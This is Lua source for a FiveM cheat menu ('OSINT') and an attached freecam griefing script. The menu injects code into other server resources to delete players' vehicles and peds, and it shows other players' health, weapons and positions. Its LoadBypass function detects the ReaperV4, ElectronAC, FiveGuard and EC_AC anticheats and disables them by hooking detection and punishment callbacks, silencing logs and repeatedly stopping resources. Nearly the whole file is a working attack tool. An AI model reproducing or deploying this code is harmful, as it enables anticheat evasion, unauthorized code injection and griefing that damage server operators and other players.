                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G.OSINTFreecamObject)
                            local rot = GetCamRot(_G.OSINTFreecamObject, 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function DeleteCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        MachoInjectResource("monitor", [[
                                            DeletePed(]] .. driver .. [[)
                                        ]])
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                    Wait(100)
                                    MachoInjectResource("monitor", [[
                                        DeleteEntity(]] .. vehicle .. [[)
                                    ]])
                                else
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(100)
                                    MachoInjectResource("monitor", [[
                                        DeleteEntity(]] .. vehicle .. [[)
                                    ]])
                                    Wait(100)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        DeleteCar(vehicle)
                                    end
                                end
                            end)
                        end
                    end
                end
            end
        end

        local hoveredTab = CurrentMenu[HoveredIndex]

        if hoveredTab then
            if hoveredTab.type == "slider" or hoveredTab.type == "slider-checkbox" then
                local maxVal = hoveredTab.max or 100
                local now = GetGameTimer()

                if maxVal <= 10 then
                    if IsControlPressed(0, 174) and now - lastSliderPress > sliderDelay then
                        OSINT:ScrollTwo("Left")
                        lastSliderPress = now
                    elseif IsControlPressed(0, 175) and now - lastSliderPress > sliderDelay then
                        OSINT:ScrollTwo("Right")
                        lastSliderPress = now
                    end
                else
                    if IsControlPressed(0, 174) then
                        OSINT:ScrollTwo("Left")
                    elseif IsControlPressed(0, 175) then
                        OSINT:ScrollTwo("Right")
                    end
                end
            end
        end
    end
end)

local lastScrollPress = 0
local scrollDelay = 120
local lastSliderPress = 0
local sliderDelay = 120
local lastCategoryPress = 0
local categoryDelay = 120

MachoOnKeyDown(function(Callback)
    local keyCode = tonumber(Callback) or Callback
    local keyName = MappedKeys[keyCode] or "Unknown"
    local scrollNow = GetGameTimer()

    if keyName == MenuKey then
        if not IsVisible and MenuOpenable then
            OSINT:ShowUI()
        end
    elseif keyName == "Backspace" then
        if IsVisible and MenuOpenable then OSINT:Backspace() end
    elseif keyName == "Enter" then
        if IsVisible and MenuOpenable then OSINT:Enter() end
    elseif keyName == "Q" and scrollNow - lastCategoryPress > categoryDelay then
        if IsVisible and MenuOpenable then OSINT:PrevCategory() end
    elseif keyName == "E" and scrollNow - lastCategoryPress > categoryDelay then
        if IsVisible and MenuOpenable then OSINT:NextCategory() end
    elseif keyName == "ArrowUp" and scrollNow - lastScrollPress > scrollDelay then
        if IsVisible then OSINT:ScrollOne("Up") lastScrollPress = scrollNow end
    elseif keyName == "ArrowDown" and scrollNow - lastScrollPress > scrollDelay then
        if IsVisible then OSINT:ScrollOne("Down") lastScrollPress = scrollNow end
    elseif keyName == "ArrowLeft" then
        local hoveredTab = CurrentMenu[HoveredIndex]
        if hoveredTab then
            if hoveredTab.type == "slider" or hoveredTab.type == "slider-checkbox" and scrollNow - lastSliderPress > sliderDelay then
                local maxVal = hoveredTab.max or 100
                local now = GetGameTimer()

                if maxVal <= 10 then
                    OSINT:ScrollTwo("Left")
                    lastSliderPress = now
                else
                    OSINT:ScrollTwo("Left")
                end
            elseif hoveredTab.type == "scrollable" or hoveredTab.type == "scrollable-checkbox" then
                OSINT:ScrollTwo("Left")
            end
        end
    elseif keyName == "ArrowRight" then
        local hoveredTab = CurrentMenu[HoveredIndex]
        if hoveredTab then
            if hoveredTab.type == "slider" or hoveredTab.type == "slider-checkbox" and scrollNow - lastSliderPress > sliderDelay then
                local maxVal = hoveredTab.max or 100
                local now = GetGameTimer()

                if maxVal <= 10 then
                    OSINT:ScrollTwo("Right")
                    lastSliderPress = now
                else
                    OSINT:ScrollTwo("Right")
                end
            elseif hoveredTab.type == "scrollable" or hoveredTab.type == "scrollable-checkbox" then
                OSINT:ScrollTwo("Right")
            end
        end
    elseif keyName == "F5" then
        local hoveredTab = CurrentMenu[HoveredIndex]
        if IsVisible and MenuOpenable and hoveredTab and (hoveredTab.type == "button" or hoveredTab.type == "checkbox" or hoveredTab.type == "slider-checkbox") then
            OSINT:HideUI()
            Wait(250)
            KeyboardInput(("Bind %s"):format(hoveredTab.label), "", function(val)
                for vk, name in pairs(MappedKeys) do
                    if name:lower() == val:lower() then
                        local fivemControl = VK_TO_FIVEM[vk]

                        for i, data in pairs(MenuKeybinds) do
                            if data.keyRaw == vk then
                                OSINT:Notify("error", "OSINT", "There is already a keybind with that key!", 3000)
                                return
                            end
                        end

                        if fivemControl then
                            MenuKeybinds[#MenuKeybinds + 1] = {
                                key = fivemControl,
                                keyRaw = vk,
                                keyLabel = MappedKeys[vk],
                                type = hoveredTab.type,
                                label = hoveredTab.label,
                                checked = hoveredTab.checked or false,
                                value = hoveredTab.value or 1.0,
                                step = hoveredTab.step or 0.25,
                                min = hoveredTab.min or 0.25,
                                max = hoveredTab.max or 5.0,
                                onSelect = hoveredTab.onSelect,
                            }

                            OSINT:ShowKeybindList(MenuKeybinds)
                        end

                        Wait(500)
                        OSINT:ShowUI()

                        return
                    end
                end
            end, "keybind")
        end
    else
        if MenuOpenable then
            for _, data in pairs(MenuKeybinds) do
                if data.type == "button" then
                    local key = data.keyRaw
                    if key then
                        if key == keyCode then
                            data.onSelect()
                            OSINT:Notify("success", "OSINT", ("You have executed %s!"):format(data.label), 3000)
                        end
                    end
                elseif data.type == "checkbox" then
                    local key = data.keyRaw
                    if key and key == keyCode then
                        data.checked = not data.checked

                        OSINT:UpdateTabChecked(ActiveMenu, data.label, data.checked)

                        if data.onSelect then
                            data.onSelect(data.checked)
                        end

                        OSINT:ShowKeybindList(MenuKeybinds)
                        OSINT:Notify(data.checked and "success" or "error", "OSINT", ("You have %s %s!"):format(data.checked and "enabled" or "disabled", data.label), 3000)

                        if IsVisible then
                            OSINT:UpdateElements(CurrentMenu)
                        end
                    end
                elseif data.type == "slider-checkbox" then
                    local key = data.keyRaw
                    if key and key == keyCode then
                        data.checked = not data.checked

                        OSINT:UpdateTabChecked(ActiveMenu, data.label, data.checked)

                        if data.onSelect then
                            data.onSelect(data.value, data.checked)
                        end

                        OSINT:ShowKeybindList(MenuKeybinds)
                        OSINT:Notify(data.checked and "success" or "error", "OSINT", ("You have %s %s!"):format(data.checked and "enabled" or "disabled", data.label), 3000)

                        if IsVisible then
                            OSINT:UpdateElements(CurrentMenu)
                        end
                    end
                end
            end
        end
    end
end)

function OSINT:InListMenu()
    return CurrentCategories and CurrentCategories[CurrentCategoryIndex] and (CurrentCategories[CurrentCategoryIndex].label == "List" or CurrentCategories[CurrentCategoryIndex].label == "Safe")
end

function OSINT:SelectEveryone()
    if not CurrentCategories or not CurrentCategories[CurrentCategoryIndex] then return end
    local category = CurrentCategories[CurrentCategoryIndex]
    if category.label ~= "List" then return end

    for i, tab in ipairs(category.tabs) do
        if tab.type == "checkbox" then
            tab.checked = true
            if tab.serverId and tonumber(tab.serverId) then
                CPlayers[tonumber(tab.serverId)] = true
            end
        end
    end

    self:UpdateElements(CurrentMenu)
end

function OSINT:UnselectEveryone()
    if not CurrentCategories or not CurrentCategories[CurrentCategoryIndex] then return end
    local category = CurrentCategories[CurrentCategoryIndex]
    if category.label ~= "List" then return end

    for i, tab in ipairs(category.tabs) do
        if tab.type == "checkbox" then
            tab.checked = false
            if tab.serverId and tonumber(tab.serverId) then
                CPlayers[tonumber(tab.serverId)] = false
            end
        end
    end

    self:UpdateElements(CurrentMenu)
end

function OSINT:ClearSelection()
    CPlayers = {}
    if CurrentCategories and CurrentCategories[CurrentCategoryIndex] then
        local category = CurrentCategories[CurrentCategoryIndex]
        if category.label == "List" and category.tabs then
            for _, tab in ipairs(category.tabs) do
                if tab.type == "checkbox" then
                    tab.checked = false
                end
            end
        end
    end

    OSINT:UnselectEveryone()
end

function OSINT:UpdateListMenu()
    if not IsVisible then return end
    if not CurrentCategories or not CurrentCategories[CurrentCategoryIndex] then return end
    local category = CurrentCategories[CurrentCategoryIndex]
    if category.label ~= "List" then return end

    local coords = GetEntityCoords(PlayerPedId())
    if not coords then return end

    local nearbyPlayers = self:GetNearbyPlayers(coords, 350.0, true)
    local dividerIndex
    for i, tab in ipairs(category.tabs) do
        if tab.type == "divider" and tab.label == "Nearby Players" then
            dividerIndex = i
            break
        end
    end
    if not dividerIndex then return end

    for i = #category.tabs, dividerIndex + 1, -1 do
        table.remove(category.tabs, i)
    end

    if #nearbyPlayers == 0 then
        category.tabs[#category.tabs + 1] = {
            type = "button",
            label = "No Nearby Players",
            disabled = true
        }
    else
        table.sort(nearbyPlayers, function(a, b) return tonumber(a.serverId) < tonumber(b.serverId) end)
        for _, player in ipairs(nearbyPlayers) do
            local sid = tonumber(player.serverId)
            if sid and player.name then
                local _, currentWeapon = GetCurrentPedWeapon(GetPlayerPed(GetPlayerFromServerId(sid)))
                category.tabs[#category.tabs + 1] = {
                    type = "checkbox",
                    label = ("%s - [%s]"):format(player.name, sid),
                    serverId = sid,
                    checked = CPlayers[sid] or false,
                    name = player.name,
                    vehicle = GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(sid))) ~= 0 and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(sid))) or nil,
                    isDriver = GetPedInVehicleSeat(GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(sid))) ~= 0 and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(sid))), -1) == GetPlayerPed(GetPlayerFromServerId(sid)) or false,
                    metaData = {
                        { key = "Distance", value = math.floor(#(GetEntityCoords(PlayerPedId()) - GetEntityCoords(GetPlayerPed(GetPlayerFromServerId(sid))))) .. ".0m" },
                        { key = "Server ID", value = sid },
                        { key = "Health", value = GetEntityHealth(GetPlayerPed(GetPlayerFromServerId(sid))), color = "0, 255, 17" },
                        { key = "Armour", value = GetPedArmour(GetPlayerPed(GetPlayerFromServerId(sid))), color = "0, 132, 255" },
                        { key = "Weapon", value = WeaponsLabels[currentWeapon] or "Unknown" },
                        { key = "Vehicle", value = GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(sid))) ~= 0 and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(sid))) or "Unknown" },
                        { key = "Alive", value = IsPedDeadOrDying(GetPlayerPed(GetPlayerFromServerId(sid))) and "Dead" or "Alive" },
                        { key = "Speed", value = math.floor(GetEntitySpeed(GetPlayerPed(GetPlayerFromServerId(sid))) * 3.6) .. ".0 km/h" },
                        { key = "Visible", value = IsEntityVisibleToScript(GetPlayerPed(GetPlayerFromServerId(sid))) and "Visible" or "Invisible" },
                    },
                    onSelect = function(checked)
                        CPlayers[sid] = checked or false
                    end
                }
            end
        end
    end

    for serverId, _ in pairs(CPlayers) do
        local stillNearby = false
        for _, player in ipairs(nearbyPlayers) do
            if tonumber(player.serverId) == tonumber(serverId) then
                stillNearby = true
                break
            end
        end
        if not stillNearby then
            CPlayers[serverId] = nil
        end
    end

    HoveredIndex = math.min(HoveredIndex or 1, math.max(1, #category.tabs))

    local ok, err = pcall(function()
        self:UpdateElements(CurrentMenu)
    end)
    if not ok then
        print("^7[^5OSINT^7]: UI update error: " .. tostring(err))
    end
end

function OSINT:AssignListMenuActions()
    if not ActiveMenu then return end

    for _, subMenu in ipairs(ActiveMenu) do
        if subMenu.label == "Server" and subMenu.categories then
            for _, category in ipairs(subMenu.categories) do
                if category.label == "List" and category.tabs then
                    for _, tab in ipairs(category.tabs) do
                        if tab.type == "button" then
                            if tab.label == "Select Everyone" then
                                tab.onSelect = function() OSINT:SelectEveryone() end
                            elseif tab.label == "Un-Select Everyone" then
                                tab.onSelect = function() OSINT:UnselectEveryone() end
                            elseif tab.label == "Clear Selection" then
                                tab.onSelect = function() OSINT:ClearSelection() end
                            end
                        end
                    end
                end
            end
        end
    end
end

CreateThread(function()
    while true do
        Wait(1500)
        if OSINT:InListMenu() and IsVisible then
            local ok, err = pcall(function()
                OSINT:UpdateListMenu()
            end)
            if not ok then
                print("^7[^5OSINT^7]: List update error: " .. tostring(err))
            end
        end
    end
end)

Wait(1000)

OSINT:AssignListMenuActions()

local electronResource = nil
local fiveguardResource = nil

local function ScanElectronAnticheat()
    for i = 0, GetNumResources() - 1 do
        local resource = GetResourceByFindIndex(i)
        local manifest = LoadResourceFile(resource, "fxmanifest.lua")
        if manifest and (string.find(manifest, "https://electron-services.com") or string.find(manifest, "Electron Services") or string.find(manifest, "The most advanced fiveM anticheat")) then
            electronResource = resource
            print("^7[^5OSINT^7]: Detected ElectronAC in Resource: " .. resource)
            return resource
        end
    end

    return nil
end

local function ScanFiveGuardAnticheat()
    for i = 0, GetNumResources() - 1 do
        local resource = GetResourceByFindIndex(i)
        local files = GetNumResourceMetadata(resource, 'client_script')
        for j = 0, files - 1 do
            local metadata = GetResourceMetadata(resource, 'client_script', j)
            if metadata and string.find(metadata, "obfuscated") then
                fiveguardResource = resource
                print("^7[^5OSINT^7]: Detected FiveGuard in Resource: " .. resource)
                return resource
            end
        end
    end
    
    return nil
end

function OSINT:LoadBypass()
    local restrictedIPs = {
        "216.146.24.88:30120",
        "91.190.154.74:30120"
    }
    local currentEndpoint = GetCurrentServerEndpoint()
    for _, ip in ipairs(restrictedIPs) do
        if currentEndpoint == ip then
            self:Notify("error", "OSINT", "Bypass disabled for this server.", 3000)
            return
        end
    end

    self:Notify("info", "OSINT", "Loading Anticheat Bypass...", 3000)
    ScanElectronAnticheat()
    ScanFiveGuardAnticheat()
    Wait(1000)

    -- ReaperV4 Bypass
    if GetResourceState("ReaperV4") == "started" then
        MachoInjectResource2(2, "ReaperV4", [[
            pcall(function()
                local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
                local eventHandlers = {}
                for name, raw in pairs(eventHandlersRaw) do
                    if raw.handlers then
                        for id, v in pairs(raw.handlers) do
                            table.insert(eventHandlers, { handle = { ['key'] = id, ['name'] = name }, func = v, type = (string.find(name, "__cfx_nui") and "NUICallback") or (string.find(name, "__cfx_export") and "Export") or "Event" })
                        end
                    end
                end
                local reaper_newdetection
                for i, v in pairs(eventHandlers) do
                    local name = v["handle"]["name"]
                    local func = v["func"]
                    if name == "Reaper:NewDetection" then
                        reaper_newdetection = func
                    end
                end
                if type(reaper_newdetection) ~= "function" then
                    return print("error")
                end
                local _, securityclient = debug.getupvalue(reaper_newdetection, 1)
                for name, detection in pairs(securityclient["detections"]) do
                    if detection["detected"] then
                        securityclient["detections"][name]["detected"] = function(...)
                            local args = { ... }
                            print(name, "detected", json.encode(args or {}))
                            return
                        end
                    end
                    if detection["callback"] then
                        securityclient["detections"][name]["callback"] = function(...)
                            local args = { ... }
                            print(name, "callback", json.encode(args or {}))
                            return
                        end
                    end
                end
                for name, detection in pairs(securityclient["active_detections"]) do
                    if detection["detected"] then
                        securityclient["active_detections"][name]["detected"] = function(...) return end
                    end
                    if detection["callback"] then
                        securityclient["active_detections"][name]["callback"] = function(...) return end
                    end
                end
                Debug.setupvalue(reaper_newdetection, 1, securityclient)
                print("ReaperV4 | Client Bypassed")
            end)
        ]])

    MachoHookNative(0xC6D3D26810C8E0F9, function(...) return false, false end)
    MachoHookNative(0x8D4D46230B2C353A, function(...) return false, 3 end)
    MachoHookNative(0xB15162CB5826E9E8, function(...) return false, true end)
    MachoHookNative(0xD5037BA82E12416F, function(...) return false, 0 end)
    MachoHookNative(0xFB92A102F1C4DFA3, function(...) return false, true end)
    print("ReaperV4 Bypass Enabled")
    self:Notify("info", "OSINT", "ReaperV4 Bypass Loaded", 3000)

    elseif electronResource ~= nil then
        Injection("ElectronAC", [[
            print = function() end
            local originalTrace = Citizen.Trace
            Citizen.Trace = function(msg)
                if not (string.find(msg, "DEBUG") or string.find(msg, "NEWDBG") or string.find(msg, "A11AXXX") or string.find(msg, "function") or string.find(msg, "TriggerServerEvent")) then
                    originalTrace(msg)
                end
            end
        ]])
        MachoInjectResource2(2, "ElectronAC", [[
            pcall(function()
                local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
                local eventHandlers = {}
                for name, raw in pairs(eventHandlersRaw) do
                    if raw.handlers then
                        for id, v in pairs(raw.handlers) do
                            table.insert(eventHandlers, { handle = { ['key'] = id, ['name'] = name }, func = v, type = (string.find(name, "__cfx_nui") and "NUICallback") or (string.find(name, "__cfx_export") and "Export") or "Event" })
                        end
                    end
                end
                local eAcVerify
                for i, v in pairs(eventHandlers) do
                    local name = v["handle"]["name"]
                    local func = v["func"]
                    if name == "ElectronAC.verify" then
                        local upname, func = debug.getupvalue(func, 1)
                        eAcVerify = func
                    end
                end
                local EACTable = nil
                local eacUpvalueIndex = nil
                local i = 1
                while true do
                    local name, value = debug.getupvalue(eAcVerify, i)
                    if not name then break end
                    if type(value) == "table" then
                        local hasEACStructure = false
                        for idx, tbl in pairs(value) do
                            if type(tbl) == "string" then
                                if tbl == "antiNuiBlocker" or tbl == "antiInvisible" then
                                    hasEACStructure = true
                                end
                                if hasEACStructure then break end
                            end
                        end
                        if hasEACStructure then
                            EACTable = value
                            eacUpvalueIndex = i
                            break
                        end
                    end
                    i = i + 1
                end
                if not EACTable then
                    print("EAC table not found!")
                    return
                end
                local punish = function(...) return end
                for idx, tbl in pairs(EACTable) do
                    if type(tbl) == "table" then
                        for subIdx, subTbl in pairs(tbl) do
                            if type(subTbl) == "table" and type(subTbl["punish"]) == "function" and subTbl["punish"] then
                                subTbl["punish"] = punish
                            end
                        end
                    end
                end
                Debug.setupvalue(eAcVerify, eacUpvalueIndex, EACTable)
                print("ElectronAC | Client Bypassed")
            end)
        ]])

    elseif fiveguardResource ~= nil then
        CreateThread(function()
            while true do
                MachoResourceStop(fiveguardResource)
                print("^7[^5OSINT^7]: Stopped Resource: " .. fiveguardResource)
                Wait(2000)
            end
        end)
        return

    elseif GetResourceState("EC_AC") == "started" then
        MachoInjectResourceRaw("EC_AC", [[print = function() end]])
        MachoInjectResourceRaw("EC_AC", [[
            local originalTrace = Citizen.Trace
            Citizen.Trace = function(msg)
                if not (
                    string.find(msg, "DEBUG") or
                    string.find(msg, "NEWDBG") or
                    string.find(msg, "A11AXXX") or
                    string.find(msg, "function") or
                    string.find(msg, "TriggerServerEvent")
                ) then
                    originalTrace(msg)
                end
            end
        ]])
        local resources = { "EC_AC" }
        for i = 1, #resources do
            local resource = resources[i]
            MachoInjectResource(resource, [[
                print(GetCurrentResourceName())
                for name, func in pairs(_G) do
                    if name == "TriggerEvent" then return end
                    _G[name] = nil
                    print(name, func)
                end
            ]])
            Wait(1050)
        end
        CreateThread(function()
            while true do
                Wait(0)
                MachoResourceStop("EC_AC")
            end
        end)
    end

    if GetResourceState("WaveShield") == 'started' then
        OSINT:Notify("error", "OSINT", "WaveShield Anticheat Found.", 3000)
    elseif GetResourceState("ReaperV4") == 'started' then
        OSINT:Notify("error", "OSINT", "ReaperV4 Anticheat Found.", 3000)
    elseif GetResourceState("ElectronAC") == 'started' then
        OSINT:Notify("error", "OSINT", "ElectronAC Anticheat Found.", 3000)
    elseif GetResourceState("FiniAC") == 'started' then
        OSINT:Notify("error", "OSINT", "FiniAC Anticheat Found.", 3000)
    end
end

Wait(500)
OSINT:LoadBypass()















































-- 4uth Credit/Protection Block
local _4uth_credit = "4uth" -- DO NOT REMOVE OR EDIT
if not _4uth_credit or _4uth_credit ~= "4uth" then error("[4uth] Credit missing or tampered. Script disabled.") end
print("[INFO][4uth] Freecam script loaded. Credits: Script customized by 4uth.")
local selected_ent = 0
local res_width, res_height = GetActiveScreenResolution()
local cam_active = false
local cam = nil
local features = { "A3 STORE", "Teleport", "Shoot",   "Vehicule Hijack", "Object Spawner", "Ped Spawner", "Spikestrip Spawner", "Explode", "Map Destroyer", "A3 STORE" }
-- Helper: Get closest player to crosshair (returns ped and server id if possible)
function GetClosestPlayerToCrosshair(coords, direction)
    if not _4uth_credit or _4uth_credit ~= "4uth" then error("[4uth] Credit missing or tampered. Script disabled.") end
    local players = GetActivePlayers()
    local myPed = PlayerPedId()
    local bestPed = nil
    local bestDist = math.huge
    local bestId = nil
    for i = 1, #players do
        local player = players[i]
        local ped = GetPlayerPed(player)
        if ped ~= myPed then
            local pedCoords = GetEntityCoords(ped)
            -- Project ped onto crosshair line
            local toPed = pedCoords - coords
            local proj = (toPed.x * direction.x + toPed.y * direction.y + toPed.z * direction.z)
            local closestPoint = coords + direction * proj
            local dist = #(pedCoords - closestPoint)
            if dist < bestDist then
                bestDist = dist
                bestPed = ped
                bestId = player
            end
        end
    end
    return bestPed, bestId, bestDist
end
-- Helper: Random position on map
function GetRandomPosition()
    if not _4uth_credit or _4uth_credit ~= "4uth" then error("[4uth] Credit missing or tampered. Script disabled.") end
    local x = math.random(-3000, 3000)
    local y = math.random(-3000, 3000)
    local z = 100.0
    local found, groundZ = GetGroundZFor_3dCoord(x, y, z, 0)
    if found then z = groundZ + 2.0 end
    return vector3(x, y, z)
end
-- Helper: List of funny objects for attach
local funnyObjects = {
    "prop_cone_float_1", "prop_toilet_01", "prop_ld_toilet_01", "prop_beachball_02", "prop_roadcone02a", "prop_barrel_02a", "prop_box_wood02a_pu", "prop_burgerstand_01"
}
-- Helper: List of funny models for change
local funnyModels = {
    "a_c_chimp", "a_c_pig", "a_c_cow", "a_c_deer", "u_m_y_hippie_01", "s_m_m_movalien_01", "a_c_hen"
}
-- Helper: List of sounds for sound spam
local funnySounds = {
    { dict = "DLC_HEIST_HACKING_SNAKE_SOUNDS", name = "Beep_Green" },
    { dict = "DLC_HEIST_HACKING_SNAKE_SOUNDS", name = "Beep_Red" },
    { dict = "DLC_XM_Silo_Sounds", name = "Alarm_Silo" },
    { dict = "DLC_AW_Frontend_Sounds", name = "MP_AW_Splash" }
}
-- Helper: List of NPCs for swarm
local npcModels = {
    "a_m_m_skater_01", "a_m_m_tramp_01", "a_m_y_hippy_01", "a_m_y_musclbeac_01", "a_m_y_roadcyc_01"
}
-- Helper: List of money bag props
local moneyProps = {
    "prop_money_bag_01", "prop_poly_bag_money"
}
-- Helper: Cage prop
local cageProp = "prop_gold_cont_01"
-- Helper: For gravity flip
local gravityFlipped = {}
-- Helper: For shrink/grow
local originalScales = {}
local lastAutoShot = 0
local weapons = {
    { name = "Pistol", hash = "weapon_pistol" },
    { name = "Combat Pistol", hash = "weapon_combatpistol" },
    { name = "AP Pistol", hash = "weapon_appistol", auto = true },
    { name = "Pistol .50", hash = "weapon_pistol50" },
    { name = "SNS Pistol", hash = "weapon_snspistol" },
    { name = "Heavy Pistol", hash = "weapon_heavypistol" },
    { name = "Vintage Pistol", hash = "weapon_vintagepistol" },
    { name = "Marksman Pistol", hash = "weapon_marksmanpistol" },
    { name = "Heavy Revolver", hash = "weapon_revolver" },
    { name = "Stun Gun", hash = "weapon_stungun" },
    { name = "Flare Gun", hash = "weapon_flaregun" },
    { name = "Micro SMG", hash = "weapon_microsmg", auto = true },
    { name = "SMG", hash = "weapon_smg", auto = true },
    { name = "Assault SMG", hash = "weapon_assaultsmg", auto = true },
    { name = "MG", hash = "weapon_mg", auto = true },
    { name = "Combat MG", hash = "weapon_combatmg", auto = true },
    { name = "Pump Shotgun", hash = "weapon_pumpshotgun" },
    { name = "Sawn-Off Shotgun", hash = "weapon_sawnoffshotgun" },
    { name = "Assault Shotgun", hash = "weapon_assaultshotgun", auto = true },
    { name = "Bullpup Shotgun", hash = "weapon_bullpupshotgun" },
    { name = "Carbine Rifle", hash = "weapon_carbinerifle", auto = true },
    { name = "Advanced Rifle", hash = "weapon_advancedrifle", auto = true },
    { name = "Special Carbine", hash = "weapon_specialcarbine", auto = true },
    { name = "Bullpup Rifle", hash = "weapon_bullpuprifle", auto = true },
    { name = "Sniper Rifle", hash = "weapon_sniperrifle" },
    { name = "Heavy Sniper", hash = "weapon_heavysniper" },
    { name = "Grenade Launcher", hash = "weapon_grenadelauncher" },
    { name = "RPG", hash = "weapon_rpg" },
    { name = "Minigun", hash = "weapon_minigun", auto = true },
    { name = "Grenade", hash = "weapon_grenade" },
    { name = "Sticky Bomb", hash = "weapon_stickybomb" },
    { name = "Molotov", hash = "weapon_molotov" }
}
local current_weapon = 1
local current_feature = 1
local teleportMarkerCoords = nil
local mapDestroyerEntity = nil
local spikestrips = {}

-- Map Destroyer: single ramp (Tube)
local mapDestroyerRamps = {
    { name = "Tube", model = "stt_prop_stunt_tube_s" }
}
local currentRampType = 1
local placedRamps = {}

function GetEmptySeat(vehicle)
    local seats = { -1, 0, 1, 2 }
    for _, seat in ipairs(seats) do
        if IsVehicleSeatFree(vehicle, seat) then
            return seat
        end
    end
    return -1
end

function draw_rect_px(x, y, w, h, r, g, b, a)
    if not _4uth_credit or _4uth_credit ~= "4uth" then error("[4uth] Credit missing or tampered. Script disabled.") end
    DrawRect((x + w / 2) / res_width, (y + h / 2) / res_height, w / res_width, h / res_height, r, g, b, a)
end

function RotationToDirection(rot)
    if not _4uth_credit or _4uth_credit ~= "4uth" then error("[4uth] Credit missing or tampered. Script disabled.") end
    local radiansZ = math.rad(rot.z)
    local radiansX = math.rad(rot.x)
    local cosX = math.cos(radiansX)
    local direction = vector3(-math.sin(radiansZ) * cosX, math.cos(radiansZ) * cosX, math.sin(radiansX))
    return direction
end

function GetClosestPlayerPed()
    if not _4uth_credit or _4uth_credit ~= "4uth" then error("[4uth] Credit missing or tampered. Script disabled.") end
    local players = GetActivePlayers()
    local myPed = PlayerPedId()
    local myCoords = GetEntityCoords(myPed)
    local closestPed = nil
    local closestDist = math.huge
    for i = 1, #players do
        local player = players[i]
        local ped = GetPlayerPed(player)
        if ped ~= myPed then
            local pedCoords = GetEntityCoords(ped)
            local dist = #(myCoords - pedCoords)
            if dist < closestDist then
                closestDist = dist
                closestPed = ped
            end
        end
    end
    return closestPed
end

function toggle_camera()
    if not _4uth_credit or _4uth_credit ~= "4uth" then error("[4uth] Credit missing or tampered. Script disabled.") end
    cam_active = not cam_active
    local playerPed = PlayerPedId()
    if cam_active then
        print("[INFO][4uth] Freecam activated from player's POV.")
        -- Start freecam from player's POV for smooth opening
        local pedCoords = GetEntityCoords(playerPed)
        local pedRot = GetEntityRotation(playerPed)
        -- Use ped's camera bone for more accurate eye position if available
        local headBone = GetPedBoneIndex(playerPed, 0x796e) -- SKEL_Head
        local camCoords = pedCoords
        if headBone and headBone ~= -1 then
            camCoords = GetWorldPositionOfEntityBone(playerPed, headBone)
        end
        -- Camera rotation: use gameplay cam if available, else ped's heading
        local gameplay_cam_rot = GetGameplayCamRot()
        local camRot = gameplay_cam_rot
        if not camRot or (camRot.x == 0.0 and camRot.y == 0.0 and camRot.z == 0.0) then
            camRot = vector3(pedRot.x, pedRot.y, GetEntityHeading(playerPed))
        end
        cam = CreateCamWithParams("DEFAULT_SCRIPTED_CAMERA", camCoords.x, camCoords.y, camCoords.z, camRot.x, camRot.y, camRot.z, 70.0)
        SetCamActive(cam, true)
        RenderScriptCams(true, true, 0, false, false)
        FreezeEntityPosition(playerPed, true)
        -- Set initial freecam rotation for smooth mouse look
        _G._freecam_rot = {x = camRot.x, y = camRot.y, z = camRot.z}
    else
        print("[INFO][4uth] Freecam deactivated, returning control to player.")
        SetCamActive(cam, false)
        RenderScriptCams(false, true, 0, false, false)
        DestroyCam(cam)
        cam = nil
        SetFocusEntity(playerPed)
